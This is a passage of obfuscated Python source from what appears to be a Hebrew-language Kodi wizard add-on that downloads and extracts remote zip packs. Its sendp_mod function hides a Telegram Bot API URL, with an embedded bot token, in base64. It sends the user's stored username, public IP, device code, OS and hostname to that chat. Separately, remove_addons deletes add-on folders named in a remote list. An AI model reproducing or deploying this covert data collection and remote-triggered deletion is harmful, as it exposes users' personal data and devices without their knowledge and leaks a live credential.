          if (time .time ()-O0O0000OOO0OOOO0O )>0 :#line:5467
            O000000O0O0O00OOO =OOO00O0OOO0OOO000 ,(time .time ()-O0O0000OOO0OOOO0O )#line:5468
            O000000O0O0O00OOO =O000000O0O0O00OOO ,1024 #line:5469
          else :#line:5470
           O000000O0O0O00OOO =0 #line:5471
          O00OO0OOO00OO0000 ='KB'#line:5472
          if O000000O0O0O00OOO >=1024 :#line:5473
             O000000O0O0O00OOO =O000000O0O0O00OOO ,1024 #line:5474
             O00OO0OOO00OO0000 ='MB'#line:5475
          if O000000O0O0O00OOO >0 and not OO0O0OOO0OO00000O ==100 :#line:5476
              O0OO0OO0O0OO00000 =(O0O00O0O0OOOO00OO -OOO00O0OOO0OOO000 ),O000000O0O0O00OOO #line:5477
          else :#line:5478
              O0OO0OO0O0OO00000 =0 #line:5479
          O00O00O0O00OOOOOO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',0 ,O00OO0OOO00OO0000 )#line:5480
          OOOO0OOOO00OO00O0 .update (int (OO0O0OOO0OO00000O ),"[B][COLOR=green]מוריד חבילת קבצים לקודי 17 - 18 [/COLOR][/B]",O00O00OOO00O00OO0 ,O00O00O0O00OOOOOO )#line:5482
    OO000O0OO0000O000 =xbmc .translatePath (os .path .join ('special://home'))#line:5485
    O0O0OO00O0OO00OOO .close ()#line:5488
    extract .all (OO000O000O00OOOO0 ,OO000O0OO0000O000 ,OOOO0OOOO00OO00O0 )#line:5489
    try :#line:5493
      os .remove (OO000O000O00OOOO0 )#line:5494
    except :#line:5495
      pass #line:5496
def linux_pack ():#line:5497
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]מוריד קבצים למערכת הפעלה לינוקס[/COLOR]'%COLOR2 )#line:5499
    OOO0OOOOOOO000000 =" Kodi Premium"#line:5502
    O0O00O0OO0OO00O00 ='http://kodi.life/linux/pack.zip'#line:5503
    OO00O0OOO000000O0 =OOO0OOOOOOO000000 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5504
    if not wiz .workingURL (O0O00O0OO0OO00O00 )==True :return #line:5505
    if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5506
    try :#line:5507
        DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,OOO0OOOOOOO000000 ),'','אנא המתן')#line:5508
    except :#line:5509
        DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,OOO0OOOOOOO000000 ))#line:5510
    OOO0OO0O00OOOOO0O =os .path .join (PACKAGES ,'%s_guisettings.zip'%OO00O0OOO000000O0 )#line:5511
    try :os .remove (OOO0OO0O00OOOOO0O )#line:5512
    except :pass #line:5513
    if 'google'in O0O00O0OO0OO00O00 :#line:5515
       googledrive_download (O0O00O0OO0OO00O00 ,OOO0OO0O00OOOOO0O ,DP ,wiz .checkBuild (OOO0OOOOOOO000000 ,'updatesize'))#line:5516
    else :#line:5518
      downloader .download (O0O00O0OO0OO00O00 ,OOO0OO0O00OOOOO0O ,DP )#line:5519
    xbmc .sleep (100 )#line:5520
    OOO0000000OO0000O ='מעדכן קבצים'#line:5521
    OO0O00O0OOO00O000 ='[COLOR %s][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0000000OO0000O )#line:5522
    try :#line:5523
        DP .update (0 ,OO0O00O0OOO00O000 ,'','אנא המתן')#line:5524
    except :#line:5525
        DP .update (0 ,OO0O00O0OOO00O000 +'\n'+''+'\n'+'אנא המתן')#line:5526
    extract .all (OOO0OO0O00OOOOO0O ,HOME ,DP ,title =OO0O00O0OOO00O000 )#line:5527
    DP .close ()#line:5528
    if INSTALLMETHOD ==1 :O000OO00O0OOO0O0O =1 #line:5530
    elif INSTALLMETHOD ==2 :O000OO00O0OOO0O0O =0 #line:5531
    else :DP .close ()#line:5532
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הושלם![/COLOR]'%COLOR2 )#line:5533
def sendp_mod (O00O00O0OOO000OO0 ):#line:5534
          import json #line:5536
          import platform as plat #line:5537
          OOO0O0OO0000O000O =(wiz .getS ("user"))#line:5540
          OOO0OO0000OOO0O0O =(wiz .getS ("pass"))#line:5541
          O000O0OO0O0O000OO =plat .uname ()#line:5542
          O00O0OOO00O0OOO00 =O000O0OO0O0O000OO [1 ]#line:5543
          OOO0O0000OO000O00 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:5544
          O0000OO0OO0O0OO00 =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDUyMzY2MjUxODY6QUFGWWswSVBCdTROWjJ1WmxQWXpidVA5NkZyZ1B0UDhnUU0vc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTc4ODIyNzI2MSZ0ZXh0PQ==').decode ('utf-8')#line:5545
          O0OOOO0O00O00O0OO =urlopen ('https://api.ipify.org/?format=json').read ()#line:5547
          OOO0OO00OO0O00O0O =str (json .loads (O0OOOO0O00O00O0OO )['ip'])#line:5548
          OOOO0OO000O0OO0O0 =OOO0O0OO0000O000O #line:5549
          O0O0OOO00O00O000O =O00O00O0OOO000OO0 #line:5550
          import socket #line:5551
          O0OOOO0O00O00O0OO =urlopen (O0000OO0OO0O0OO00 +que ('בקשה לפתיחת תוכן טורקי: ')+O0O0OOO00O00O000O +que (' קוד מכשיר: ')+(HARDWAER )+que (' שם משתמש: ')+OOOO0OO000O0OO0O0 +que (' קודי: ')+OOO0O0000OO000O00 +que (' כתובת: ')+OOO0OO00OO0O00O0O +que (' מערכת הפעלה: ')+wiz .platform_d ()+que (' שם המערכת: ')+O00O0OOO00O0OOO00 ).readlines ()#line:5552
          O0OOOO0O00O00O0OO =urlopen (O0000OO0OO0O0OO00 +'@@@'+O0O0OOO00O00O000O )#line:5553
def install_turkey ():#line:5556
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'Dragon Turkey'),'[COLOR %s]מוריד חיבלת תוכן טורקי[/COLOR]'%COLOR2 )#line:5558
    O0O00O0O00000OOOO ="Dragon Turkey"#line:5561
    O0O00000O0O0OO000 ='https://github.com/vip200/victory/blob/master/plugin.video.dragonFRD.zip?raw=true'#line:5562
    if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5565
    try :#line:5566
        DP .create ('Dragon Turkey','[COLOR %s][B]מוריד[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,O0O00O0O00000OOOO ),'','אנא המתן')#line:5567
    except :#line:5568
        DP .create ('Dragon Turkey','[COLOR %s][B]מוריד[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,O0O00O0O00000OOOO ))#line:5569
    OOOOOOO00O00O000O =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0O00O0O00000OOOO )#line:5570
    try :os .remove (OOOOOOO00O00O000O )#line:5571
    except :pass #line:5572
    if 'google'in O0O00000O0O0OO000 :#line:5574
       googledrive_download (O0O00000O0O0OO000 ,OOOOOOO00O00O000O ,DP ,wiz .checkBuild (O0O00O0O00000OOOO ,'updatesize'))#line:5575
    else :#line:5577
      downloader .download (O0O00000O0O0OO000 ,OOOOOOO00O00O000O ,DP )#line:5578
    xbmc .sleep (100 )#line:5579
    OOOO0OOO0OO0O00O0 ='מעדכן קבצים'#line:5580
    OO0O0000OO0O0O000 ='[COLOR %s][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO0OOO0OO0O00O0 )#line:5581
    try :#line:5582
        DP .update (0 ,OO0O0000OO0O0O000 ,'','אנא המתן')#line:5583
    except :#line:5584
        DP .update (0 ,OO0O0000OO0O0O000 +'\n'+''+'\n'+'אנא המתן')#line:5585
    extract .all (OOOOOOO00O00O000O ,ADDONS ,DP ,title =OO0O0000OO0O0O000 )#line:5586
    try :#line:5587
        dragon_menu_hub ()#line:5588
    except Exception as OOOO0OO0000OOOO00 :#line:5589
                    logging .warning ('dragon hub errrrrrrror'+str (OOOO0OO0000OOOO00 ))#line:5590
    DP .close ()#line:5591
def disply_hwr3 ():#line:5592
    from datetime import date #line:5593
    OO0O00000O0O00000 =date .today ()#line:5595
    OO00O0O0O00OOO000 =str (OO0O00000O0O00000 ).split ('-')[2 ]#line:5596
    O0O0O00OOOOO0OOOO =tmdb_list (TMDB_NEW_API2 )#line:5598
    O0OO0O0O0O000OOOO =str ((getHwAddr ('eth0'))*O0O0O00OOOOO0OOOO )#line:5599
    OO000O00OOO000000 =(O0OO0O0O0O000OOOO [1 ]+O0OO0O0O0O000OOOO [2 ]+OO00O0O0O00OOO000 )#line:5600
    sendp_mod (OO000O00OOO000000 )#line:5602
def install_turkey_bot ():#line:5603
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'Dragon Turkey'),'[COLOR %s]מוריד חיבלת תוכן טורקי[/COLOR]'%COLOR2 )#line:5605
    O00OOOOOO0O0O000O ="Dragon Turkey"#line:5608
    O0O000O0000000OO0 ='https://github.com/vip200/victory/blob/master/plugin.video.dragonFRD.zip?raw=true'#line:5609
    if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5612
    try :#line:5613
        DP .create ('Dragon Turkey','[COLOR %s][B]מוריד[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,O00OOOOOO0O0O000O ),'','אנא המתן')#line:5614
    except :#line:5615
        DP .create ('Dragon Turkey','[COLOR %s][B]מוריד[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,O00OOOOOO0O0O000O ))#line:5616
    O0O0OO000OO0O00OO =os .path .join (PACKAGES ,'%s_guisettings.zip'%O00OOOOOO0O0O000O )#line:5617
    if 'google'in O0O000O0000000OO0 :#line:5619
       googledrive_download (O0O000O0000000OO0 ,O0O0OO000OO0O00OO ,DP ,wiz .checkBuild (O00OOOOOO0O0O000O ,'updatesize'))#line:5620
    else :#line:5622
      downloader .download (O0O000O0000000OO0 ,O0O0OO000OO0O00OO ,DP )#line:5623
    xbmc .sleep (100 )#line:5624
    OO0000OOO0OO00000 ='מעדכן קבצים'#line:5625
    OO00000000OO0OOOO ='[COLOR %s][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0000OOO0OO00000 )#line:5626
    try :#line:5627
        DP .update (0 ,OO00000000OO0OOOO ,'','אנא המתן')#line:5628
    except :#line:5629
        DP .update (0 ,OO00000000OO0OOOO +'\n'+''+'\n'+'אנא המתן')#line:5630
    extract .all (O0O0OO000OO0O00OO ,ADDONS ,DP ,title =OO00000000OO0OOOO )#line:5631
    DP .close ()#line:5632
    xbmc .sleep (100 )#line:5634
    try :os .remove (O0O0OO000OO0O00OO )#line:5635
    except :pass #line:5636
    wiz .kodi17Fix ()#line:5637
def get_pincode (O000O0OOOOO0OOO00 ):#line:5638
    OO0O0OOOO0OOO0O0O =time .time ()+300 #line:5640
    while (O000O0OOOOO0OOO00 =='empty'or O000O0OOOOO0OOO00 ==None ):#line:5641
          wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'Dragon'),'[COLOR %s]המתן לתגובה מ Dragon[/COLOR]'%COLOR2 )#line:5642
          O000O0OOOOO0OOO00 =readcode ()#line:5643
          if time .time ()>OO0O0OOOO0OOO0O0O :#line:5644
            O000O0OOOOO0OOO00 ='play_tele'#line:5645
    return O000O0OOOOO0OOO00 #line:5646
def open_turkey ():#line:5648
    if wiz .getS ("dragon")=='true':#line:5649
        try :#line:5650
            OOO0O0O0000OOO0O0 =xbmcgui .DialogBusy ()#line:5651
            OOO0O0O0000OOO0O0 .create ()#line:5652
        except :#line:5653
           xbmc .executebuiltin ('ActivateWindow(busydialognocancel)')#line:5654
        O0OOOO0000000OO0O =xbmcgui .Dialog ()#line:5655
        O0OOOO0000OOO000O =O0OOOO0000000OO0O .yesno ('Dragon Turkey',"התהליך מתבצע פחות מדקה, להמשך לחצו אישור.",yeslabel ="[B][COLOR WHITE]אישור[/COLOR][/B]",nolabel ="[B][COLOR white]ביטול[/COLOR][/B]")#line:5656
        if O0OOOO0000OOO000O ==0 :#line:5657
            xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:5658
            sys .exit ()#line:5659
        else :#line:5660
            from datetime import date #line:5662
            OOOO0O0O0O0000OOO =date .today ()#line:5664
            OOO000O0OOOOO0O00 =str (OOOO0O0O0O0000OOO ).split ('-')[2 ]#line:5665
            wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'Dragon Turkey'),'[COLOR %s]מבצע אימות, המתן...[/COLOR]'%COLOR2 )#line:5666
            from math import sqrt #line:5668
            O000O0OO00OOO0000 =tmdb_list (TMDB_NEW_API2 )#line:5669
            O00OOO00OO00O0000 =str ((getHwAddr ('eth0'))*O000O0OO00OOO0000 )#line:5670
            O0O000OOOOOO0O0OO =int (O00OOO00OO00O0000 [1 ]+O00OOO00OO00O0000 [2 ]+OOO000O0OOOOO0O00 )#line:5671
            O000OO00O000O0OO0 =(str (round (sqrt ((O0O000OOOOOO0O0OO *200 )+40 )+40 ,4 ))[-4 :]).replace ('.','')#line:5672
            if '.'in O000OO00O000O0OO0 :#line:5673
             O000OO00O000O0OO0 =(str (round (sqrt ((O0O000OOOOOO0O0OO *200 )+40 )+40 ,4 ))[-5 :]).replace ('.','')#line:5674
            disply_hwr3 ()#line:5675
            OO0OOOO00O00OO000 =get_pincode (code_link )#line:5682
            xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:5683
            if OO0OOOO00O00OO000 ==O000OO00O000O0OO0 :#line:5684
                install_turkey_bot ()#line:5685
                try :#line:5686
                    dragon_menu_hub ()#line:5687
                except Exception as OOO0O00O000OO0OO0 :#line:5688
                                logging .warning ('dragon hub errrrrrrror'+str (OOO0O00O000OO0OO0 ))#line:5689
                wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'Dragon Turkey'),'[COLOR %s]התוכן נפתח![/COLOR]'%COLOR2 )#line:5690
            else :#line:5691
              wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'Dragon Turkey'),'[COLOR %s]אין גישה לתוכן[/COLOR]'%COLOR2 )#line:5692
              sys .exit ()#line:5693
    else :#line:5694
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'Dragon Turkey'),'[COLOR %s]לא פעיל[/COLOR]'%COLOR2 )#line:5695
def telemedia5 ():#line:5696
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]מוריד טלמדיה לאנדרואיד 5[/COLOR]'%COLOR2 )#line:5697
    OOO00O0O00000OOO0 =" Kodi Premium"#line:5700
    O00O0000O0OO00000 ='http://kodi.life/telemedia/telemedia.zip'#line:5701
    OOOOO00OOO00O0O0O =OOO00O0O00000OOO0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5702
    if not wiz .workingURL (O00O0000O0OO00000 )==True :return #line:5703
    if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5704
    try :#line:5705
        DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,OOO00O0O00000OOO0 ),'','אנא המתן')#line:5706
    except :#line:5707
        DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,OOO00O0O00000OOO0 ))#line:5708
    OOOOOOOOO0000OO00 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOOOO00OOO00O0O0O )#line:5709
    try :os .remove (OOOOOOOOO0000OO00 )#line:5710
    except :pass #line:5711
    if 'google'in O00O0000O0OO00000 :#line:5713
       googledrive_download (O00O0000O0OO00000 ,OOOOOOOOO0000OO00 ,DP ,wiz .checkBuild (OOO00O0O00000OOO0 ,'updatesize'))#line:5714
    else :#line:5716
      downloader .download (O00O0000O0OO00000 ,OOOOOOOOO0000OO00 ,DP )#line:5717
    xbmc .sleep (100 )#line:5718
    O0000OO0O0OO0OOO0 ='מעדכן קבצים'#line:5719
    OO00000O000OO00O0 ='[COLOR %s][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0000OO0O0OO0OOO0 )#line:5720
    try :#line:5721
        DP .update (0 ,OO00000O000OO00O0 ,'','אנא המתן')#line:5722
    except :#line:5723
        DP .update (0 ,OO00000O000OO00O0 +'\n'+''+'\n'+'אנא המתן')#line:5724
    extract .all (OOOOOOOOO0000OO00 ,HOME ,DP ,title =OO00000O000OO00O0 )#line:5725
    DP .close ()#line:5726
    if INSTALLMETHOD ==1 :OO000OOOOO0O0O000 =1 #line:5728
    elif INSTALLMETHOD ==2 :OO000OOOOO0O0O000 =0 #line:5729
    else :DP .close ()#line:5730
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הושלם![/COLOR]'%COLOR2 )#line:5731
def testnotify ():#line:5736
    try :#line:5737
        O0OOOO000O00OO00O =xbmcgui .DialogBusy ()#line:5738
        O0OOOO000O00OO00O .create ()#line:5739
    except :#line:5740
       xbmc .executebuiltin ('ActivateWindow(busydialognocancel)')#line:5741
    OO00OO00O0000OO0O =wiz .workingURL (NOTIFICATION )#line:5742
    if OO00OO00O0000OO0O ==True :#line:5743
        try :#line:5744
            OO0OO0O00O00O00O0 ,O0000OOOO0OOO0OO0 =wiz .splitNotify (NOTIFICATION )#line:5745
            if OO0OO0O00O00O00O0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון [/COLOR]"%COLOR2 );return #line:5746
            if wiz .STARTP ()=='ok':#line:5747
                check ()#line:5748
                notify .notification (O0000OOOO0OOO0OO0 ,True )#line:5749
        except Exception as OO0OO00OO0O00OO00 :#line:5750
            wiz .log ("Error on Notifications Window: %s"%str (OO0OO00OO0O00OO00 ),5 )#line:5751
    else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון[/COLOR]"%COLOR2 )#line:5752
    xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:5753
def testnotify2 ():#line:5754
	O0O0O00O000OO0000 =wiz .workingURL (NOTIFICATION2 )#line:5755
	if O0O0O00O000OO0000 ==True :#line:5756
		try :#line:5757
			OOOO00OO00O0OOOOO ,OOO000O0O0OOO0OO0 =wiz .splitNotify (NOTIFICATION2 )#line:5758
			if OOOO00OO00O0OOOOO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון[/COLOR]"%COLOR2 );return #line:5759
			if wiz .STARTP ()=='ok':#line:5760
				notify .notification2 (OOO000O0O0OOO0OO0 ,True )#line:5761
		except Exception as OO000000O0OO000O0 :#line:5762
			wiz .log ("Error on Notifications Window: %s"%str (OO000000O0OO000O0 ),5 )#line:5763
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון [/COLOR]"%COLOR2 )#line:5764
def testnotify3 ():#line:5765
	OO0OOOOOO00O000O0 =wiz .workingURL (NOTIFICATION3 )#line:5766
	if OO0OOOOOO00O000O0 ==True :#line:5767
		try :#line:5768
			OO00OOO0OOO00OOO0 ,OO000OOO000OOOOOO =wiz .splitNotify (NOTIFICATION3 )#line:5769
			if OO00OOO0OOO00OOO0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5770
			if wiz .STARTP ()=='ok':#line:5771
				notify .notification3 (OO000OOO000OOOOOO ,True )#line:5772
		except Exception as OOOOO0O000OOOOO00 :#line:5773
			wiz .log ("Error on Notifications Window: %s"%str (OOOOO0O000OOOOO00 ),5 )#line:5774
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5775
def wait ():#line:5776
 wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אנא המתן[/COLOR]"%COLOR2 )#line:5777
def infobuild ():#line:5778
	OO00O0O00O0OOO0OO =wiz .workingURL (NOTIFICATION )#line:5779
	if OO00O0O00O0OOO0OO ==True :#line:5780
		try :#line:5781
			O00000O00OO0O0OO0 ,O0OOO0O000O000OOO =wiz .splitNotify (NOTIFICATION )#line:5782
			if O00000O00OO0O0OO0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5783
			if wiz .STARTP ()=='ok':#line:5784
				notify .updateinfo (O0OOO0O000O000OOO ,True )#line:5785
		except Exception as O0O0O0OO00O00O0O0 :#line:5786
			wiz .log ("Error on Notifications Window: %s"%str (O0O0O0OO00O00O0O0 ),5 )#line:5787
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5788
def servicemanual ():#line:5790
	OO0OO00O000OO000O =wiz .workingURL (HELPINFO )#line:5791
	if OO0OO00O000OO000O ==True :#line:5792
		try :#line:5793
			O0OOO000O0O0O00OO ,O0OO0O0OO0OO0O00O =wiz .splitNotify (HELPINFO )#line:5794
			if O0OOO000O0O0O00OO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:5795
			notify .helpinfo (O0OO0O0OO0OO0O00O ,True )#line:5796
		except Exception as O000O0OOOOO0000OO :#line:5797
			wiz .log ("Error on Notifications Window: %s"%str (O000O0OOOOO0000OO ),5 )#line:5798
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:5799
def testupdate ():#line:5801
	if BUILDNAME =="":#line:5802
		notify .updateWindow ()#line:5803
	else :#line:5804
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:5805
def testfirst ():#line:5807
	notify .firstRun ()#line:5808
def testfirstRun ():#line:5810
	notify .firstRunSettings ()#line:5811
def fastinstall ():#line:5814
	notify .firstRuninstall ()#line:5815
def addDir (OOOO0O00000OO0O0O ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5822
    OO00O00O00OO000O0 =sys .argv [0 ]#line:5823
    if not mode ==None :OO00O00O00OO000O0 +="?mode=%s"%que (mode )#line:5824
    if not name ==None :OO00O00O00OO000O0 +="&name="+que (name )#line:5825
    if not url ==None :OO00O00O00OO000O0 +="&url="+que (url )#line:5826
    O0O0OO0O0OO0OO00O =True #line:5827
    if themeit :OOOO0O00000OO0O0O =themeit %OOOO0O00000OO0O0O #line:5828
    try :#line:5829
      OO0000O0000O00OO0 =xbmcgui .ListItem (OOOO0O00000OO0O0O ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5830
    except :#line:5831
      OO0000O0000O00OO0 =xbmcgui .ListItem (OOOO0O00000OO0O0O )#line:5832
      OO0000O0000O00OO0 .setArt ({'thumb':icon ,'fanart':icon ,'DefaultFolder.png':icon })#line:5833
    OO0000O0000O00OO0 .setInfo (type ="Video",infoLabels ={"Title":OOOO0O00000OO0O0O ,"Plot":description })#line:5834
    OO0000O0000O00OO0 .setProperty ("Fanart_Image",fanart )#line:5835
    if not menu ==None :OO0000O0000O00OO0 .addContextMenuItems (menu ,replaceItems =overwrite )#line:5836
    O0O0OO0O0OO0OO00O =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OO00O00O00OO000O0 ,listitem =OO0000O0000O00OO0 ,isFolder =True )#line:5837
    return O0O0OO0O0OO0OO00O #line:5838
def addFile (O0OO00OOOO000OOO0 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5840
    O0O0OOOO0000OO000 =sys .argv [0 ]#line:5841
    try :#line:5842
        if not mode ==None :O0O0OOOO0000OO000 +="?mode=%s"%que (mode )#line:5843
        if not name ==None :O0O0OOOO0000OO000 +="&name="+que (name )#line:5844
        if not url ==None :O0O0OOOO0000OO000 +="&url="+que (url )#line:5845
    except :#line:5846
        if not mode ==None :O0O0OOOO0000OO000 +="?mode=%s"%que (mode )#line:5847
        if not name ==None :O0O0OOOO0000OO000 +="&name="+que (name )#line:5848
        if not url ==None :O0O0OOOO0000OO000 +="&url="+que (url )#line:5849
    OO0O00OOO0O0O0000 =True #line:5850
    if themeit :O0OO00OOOO000OOO0 =themeit %O0OO00OOOO000OOO0 #line:5851
    try :#line:5852
        O00O0OO00O000OOO0 =xbmcgui .ListItem (O0OO00OOOO000OOO0 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5853
    except :#line:5854
        O00O0OO00O000OOO0 =xbmcgui .ListItem (O0OO00OOOO000OOO0 )#line:5855
        O00O0OO00O000OOO0 .setArt ({'thumb':icon ,'fanart':icon ,'DefaultFolder.png':icon })#line:5856
    O00O0OO00O000OOO0 .setInfo (type ="Video",infoLabels ={"Title":O0OO00OOOO000OOO0 ,"Plot":description })#line:5857
    O00O0OO00O000OOO0 .setProperty ("Fanart_Image",fanart )#line:5858
    if not menu ==None :O00O0OO00O000OOO0 .addContextMenuItems (menu ,replaceItems =overwrite )#line:5859
    OO0O00OOO0O0O0000 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O0O0OOOO0000OO000 ,listitem =O00O0OO00O000OOO0 ,isFolder =False )#line:5860
    return OO0O00OOO0O0O0000 #line:5861
def get_params17_18 ():#line:5863
	OO0O00O00OOOOO00O =[]#line:5864
	O00000O000O000O00 =sys .argv [2 ]#line:5865
	if len (O00000O000O000O00 )>=2 :#line:5866
		O0O0OO0OO0O00OO00 =sys .argv [2 ]#line:5867
		OO00OOO000OO0O00O =O0O0OO0OO0O00OO00 .replace ('?','')#line:5868
		if (O0O0OO0OO0O00OO00 [len (O0O0OO0OO0O00OO00 )-1 ]=='/'):#line:5869
			O0O0OO0OO0O00OO00 =O0O0OO0OO0O00OO00 [0 :len (O0O0OO0OO0O00OO00 )-2 ]#line:5870
		O0O0OO0O0O00000OO =OO00OOO000OO0O00O .split ('&')#line:5871
		OO0O00O00OOOOO00O ={}#line:5872
		for OO0OOOO000O0000OO in range (len (O0O0OO0O0O00000OO )):#line:5873
			OOOO000O0OO00OOO0 ={}#line:5874
			OOOO000O0OO00OOO0 =O0O0OO0O0O00000OO [OO0OOOO000O0000OO ].split ('=')#line:5875
			if (len (OOOO000O0OO00OOO0 ))==2 :#line:5876
				OO0O00O00OOOOO00O [OOOO000O0OO00OOO0 [0 ]]=OOOO000O0OO00OOO0 [1 ]#line:5877
		return OO0O00O00OOOOO00O #line:5879
def get_params (user_params =''):#line:5880
        if KODI_VERSION >18 :#line:5882
            OOOOO0OOOOOOO00OO =dict (parse_qsl (user_params .replace ('?','')))#line:5883
        else :#line:5884
            O000O000O000OO000 =dict (parse_qsl (user_params .replace ('?','')))#line:5885
            OOOOO0OOOOOOO00OO ={O000OO0OOO00O000O :OOO00000OOO0O0O0O [0 ]for O000OO0OOO00O000O ,OOO00000OOO0O0O0O in O000O000O000OO000 .items ()}#line:5886
        return OOOOO0OOOOOOO00OO #line:5889
def remove_addons ():#line:5890
	try :#line:5891
			import json #line:5892
			O000O0OOOOOO000O0 =urlopen (remove_url ).readlines ()#line:5893
			for OOO0O0O00OO000OO0 in O000O0OOOOOO000O0 :#line:5894
				O0000000OOOO00O0O =OOO0O0O00OO000OO0 .split (':')[1 ].strip ()#line:5896
				OOOO0O0O00OOO0O0O ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(O0000000OOOO00O0O ,'false')#line:5897
				O0OO00O0000OO0OO0 =xbmc .executeJSONRPC (OOOO0O0O00OOO0O0O )#line:5898
				OOO0OOOO000O00OO0 =json .loads (O0OO00O0000OO0OO0 )#line:5899
				O000OOO00000O0000 =os .path .join (addons_folder ,O0000000OOOO00O0O )#line:5901
				if os .path .exists (O000OOO00000O0000 ):#line:5903
					for OO0O0O0O0O0O00000 ,O0O000OOOO0O0O0O0 ,OO00O0000OOO0O0O0 in os .walk (O000OOO00000O0000 ):#line:5904
						for O00OO00000O0000O0 in OO00O0000OOO0O0O0 :#line:5905
							os .unlink (os .path .join (OO0O0O0O0O0O00000 ,O00OO00000O0000O0 ))#line:5906
						for OOO0000O00O0O00O0 in O0O000OOOO0O0O0O0 :#line:5907
							shutil .rmtree (os .path .join (OO0O0O0O0O0O00000 ,OOO0000O00O0O00O0 ))#line:5908
					os .rmdir (O000OOO00000O0000 )#line:5909
